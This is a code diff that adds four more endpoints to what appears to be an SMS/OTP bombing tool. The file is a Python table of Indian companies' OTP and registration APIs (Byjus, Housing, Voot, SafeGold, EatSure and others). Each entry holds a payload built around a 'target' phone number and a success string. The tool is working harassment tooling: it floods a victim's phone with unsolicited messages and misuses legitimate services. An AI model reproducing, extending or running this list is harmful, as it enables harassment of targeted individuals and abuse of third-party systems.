@@ -1,3 +1,5 @@
+# Credits to Ansh Dadwal
+
 apidata = {
 
 "Byjus":("https://mtnucleus.byjusweb.com/api/acs/v2/send-otp",{"phoneNumber":target,"page":"free-trial-classes"},{},"POST","""{"isOtpExhausted":false,"""),
@@ -8,9 +10,27 @@ apidata = {
 
 "Housing":("https://login.housing.com/api/v2/send-otp",{"phone": f"{target}"},{},"POST","Sent"),
 
+"Voot":("https://userauth.voot.com/usersV3/v3/checkUser",{"type":"mobile","mobile":target,"countryCode":"+91"},{},"POST",'isExist":false'),
+
+"gold":("https://www.safegold.com/register",{"whatsappOptStatus":true,"enable_whatsapp":true,"is_check":true,"mobile_no":target,"middlename":"","name":""},{},"POST","redirect_url"),
+
+"eatsre":("https://www.eatsure.com/v1/api/send_otp",{"phone_number": target,"country_code":"IND","dialing_code":"+91","is_new_customer":false},{},"POST",'statusCode":2'),
+
+"idn":("https://www.industrybuying.com/user/api/send-otp/",{"username":target+"&"},{},"POST","200")
 
 }
 
 
 
-apis = [apidata["Byjus"],apidata["Rummycircle"],apidata["Kisan"],apidata["Housing"]]
+apis = [
+
+apidata["Byjus"],
+apidata["Rummycircle"],
+apidata["Kisan"],
+apidata["Housing"],
+apidata["Voot"],
+apidata["eatsre"],
+apidata["gold"],
+apidata["idn"]
+
+]
